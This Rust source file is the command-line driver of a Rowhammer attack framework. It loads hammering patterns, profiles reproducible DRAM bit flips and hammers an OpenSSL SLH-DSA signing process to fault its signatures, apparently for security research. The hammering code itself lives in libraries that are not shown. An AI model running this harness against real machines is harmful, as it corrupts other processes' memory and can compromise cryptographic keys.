use std::{
    fs::File,
    io::{BufReader, BufWriter, Write, stdin},
    time::Duration,
};

use anyhow::bail;
use clap::Parser;
use indicatif::MultiProgress;
use indicatif_log_bridge::LogWrapper;
use log::info;
use serde::Serialize;
use swage::blacksmith::{Blacksmith, BlacksmithConfig, FromBlacksmithConfig};
use swage::blacksmith::{FuzzSummary, HammeringPattern, PatternAddressMapper};
use swage::memory::MemConfiguration;
use swage::retry;
use swage::{ExperimentData, Swage, SwageConfig};
use swage::{allocator::ConsecAllocator, victim::VictimResult};
use swage_victim_ossl_slh_dsa::OsslSlhDsa;

/// CLI arguments for the `hammer` binary.
///
/// This struct defines the command line arguments that can be passed to the `hammer` binary.
#[derive(Debug, Parser, Serialize)]
struct CliArgs {
    ///The `blacksmith` config file.
    #[clap(long = "config", default_value = "config/bs-config.json")]
    config: String,
    /// The JSON file containing hammering patterns to load.
    #[clap(long = "load-json", default_value = "config/fuzz-summary.json")]
    load_json: String,
    /// The pattern ID to load from the `blacksmith` JSON file.
    #[clap(
        long = "pattern",
        default_value = "39ad622b-3bfe-4161-b860-dad5f3e6dd68"
    )]
    pattern: Option<String>,
    /// The mapping ID to load from the `blacksmith` JSON file. Optional argument, will determine most optimal pattern if omitted.
    #[clap(long = "mapping")]
    mapping: Option<String>,
    /// Repeat the hammering until the target reports a successful attack. If --repeat is specified without a value, the hammering will
    /// repeat indefinitely. The victim process is restarted for each repetition. The default is to repeat the hammering once and exit even if the attack was not successful.
    /// A repetition denotes a complete run of the suite:
    /// 1. allocate memory using the requested `alloc-strategy`
    /// 2. initialize the victim, potentially running a memory massaging technique to inject a target page
    /// 3. run the hammer attack using the requested `hammerer` for a number of `rounds`
    /// 4. If the attack was successful: log the report and exit. Otherwise, repeat the suite if the repetition limit is not reached.
    #[arg(long)]
    repeat: Option<u64>,
    /// The timeout in minutes for the process, i.e., the time the hammerer process is expected to run before quitting.
    #[arg(long)]
    timeout: Option<u64>,
    /// The hammering timeout in minutes, i.e., the net hammering time.
    #[arg(long)]
    hammering_timeout: Option<u64>,
    /// The number of rounds to profile for vulnerable addresses.
    /// A round denotes a run of a given hammerer, potentially with multiple attempts at hammering the target.
    #[arg(long, default_value = "3")]
    profiling_rounds: u64,
    /// The reproducibility threshold for a bit flip to be considered reproducible.
    /// The threshold is a fraction of the number of profiling rounds. If a bit flip is detected in at least `threshold` rounds, it is considered reproducible.
    /// The default value of 0.8 means that a bit flip must be detected in at least 80% of the profiling rounds to be considered reproducible.
    #[arg(long, default_value = "0.8")]
    reproducibility_threshold: f64,
    /// The number of hammering attempts per round.
    /// An attempt denotes a single run of the hammering code. Usually, hammerers need several attempts to successfully flip a bit in the victim.
    /// The default value of 20 is a good starting point for the swage-blacksmith hammerer.
    #[arg(long, default_value = "20")]
    attempts: u32,
}

fn cli_ask_pattern(json_filename: String) -> anyhow::Result<String> {
    let f = File::open(&json_filename)?;
    let reader = BufReader::new(f);
    let fuzz: FuzzSummary = serde_json::from_reader(reader)?;
    let pattern = retry!(|| {
        println!("Please choose a pattern:");
        for (i, pattern) in fuzz.hammering_patterns.iter().enumerate() {
            let best_mapping = pattern
                .determine_most_effective_mapping()
                .expect("no mappings");
            println!(
                "{}: {} (best mapping {} with {} flips)",
                i,
                pattern.id,
                best_mapping.id,
                best_mapping.count_bitflips()
            )
        }
        let mut option = String::new();
        stdin()
            .read_line(&mut option)
            .expect("Did not enter a correct string");
        match str::parse::<usize>(option.trim()) {
            Ok(i) => {
                if i < fuzz.hammering_patterns.len() {
                    return Ok(fuzz.hammering_patterns[i].id.clone());
                }
                bail!(
                    "Invalid pattern index {}/{}",
                    i,
                    fuzz.hammering_patterns.len()
                );
            }
            Err(e) => Err(e.into()),
        }
    });
    Ok(pattern)
}

struct LoadedPattern {
    pattern: HammeringPattern,
    mapping: PatternAddressMapper,
}

fn load_pattern(args: &CliArgs) -> anyhow::Result<LoadedPattern> {
    // load patterns from JSON
    let pattern = match &args.pattern {
        Some(pattern) => pattern.clone(),
        None => cli_ask_pattern(args.load_json.clone())?,
    };

    let pattern = HammeringPattern::load_pattern_from_json(args.load_json.clone(), pattern)?;
    let mapping = match &args.mapping {
        Some(mapping) => pattern.find_mapping(mapping).expect("mapping not found"),
        None => pattern
            .determine_most_effective_mapping()
            .expect("pattern contains no mapping"),
    };

    info!("Using mapping {}", mapping.id);
    let max_flips = mapping.count_bitflips();
    info!("Max flips: {:?}", max_flips);
    if max_flips == 0 {
        bail!("No flips in mapping");
    }
    Ok(LoadedPattern { pattern, mapping })
}

fn main() -> anyhow::Result<()> {
    let progress = init_logging_with_progress()?;

    // parse args
    let args = CliArgs::parse();

    let swage_config = SwageConfig {
        timeout: args.timeout.map(|t| Duration::from_secs(t * 60)),
        hammering_timeout: args.hammering_timeout.map(|t| Duration::from_secs(t * 60)),
        repetitions: args.repeat,
        profiling_rounds: args.profiling_rounds,
        reproducibility_threshold: args.reproducibility_threshold,
    };

    let config = BlacksmithConfig::from_jsonfile(&args.config)?;
    let mem_config = MemConfiguration::from_blacksmith(&config);
    let pattern = load_pattern(&args)?;

    info!("Args: {:?}", args);

    let allocator = swage::allocator::Spoiler::new(mem_config, config.threshold.into(), Some(progress.clone()));
    //let allocator = swage::allocator::Pfn::new(mem_config, None.into());
    //let allocator = THP::new(config.threshold, Some(progress.clone()));

    let block_size = allocator.block_size().bytes();
    let block_shift = block_size.ilog2() as usize;
    let num_sets = pattern
        .mapping
        .aggressor_sets(mem_config, block_shift)
        .len();
    let swage = Swage::<Blacksmith, Blacksmith, std::io::Error>::builder()
        .allocator(allocator)
        .profile_hammerer_factory(move |memory| {
            Blacksmith::new(
                mem_config,
                &pattern.pattern,
                &pattern.mapping,
                block_shift.into(),
                &memory,
                args.attempts.into(),
            )
        })
        .victim_factory(|_, profiling| {
            Box::new(
                OsslSlhDsa::new(*profiling.bit_flips.first().expect("No flips found"))
                    .expect("Failed to create victim"),
            )
        })
        .progress(progress.clone())
        .pattern_size(num_sets * block_size)
        .config(swage_config)
        .build()?;
    let experiments = swage.run();

    // persist results to disk and exit
    let now = chrono::Local::now().format("%Y-%m-%d_%H-%M-%S").to_string();
    let results_file = format!("results/results_{}.json", now);
    info!(
        "Timeout reached. Writing experiment results to file {}.",
        results_file
    );
    #[derive(Serialize)]
    struct ExperimentResult<E: std::error::Error> {
        args: CliArgs,
        experiments: Vec<ExperimentData<VictimResult, E>>,
    }
    let res = ExperimentResult { args, experiments };
    let mut json_file = BufWriter::new(File::create(results_file)?);
    serde_json::to_writer_pretty(&mut json_file, &res)?;
    json_file.flush()?;
    Ok(())
}

fn init_logging_with_progress() -> anyhow::Result<MultiProgress> {
    let logger =
        env_logger::Builder::from_env(env_logger::Env::default().default_filter_or("info")).build();
    let progress = MultiProgress::new();
    LogWrapper::new(progress.clone(), logger).try_init()?;
    Ok(progress)
}
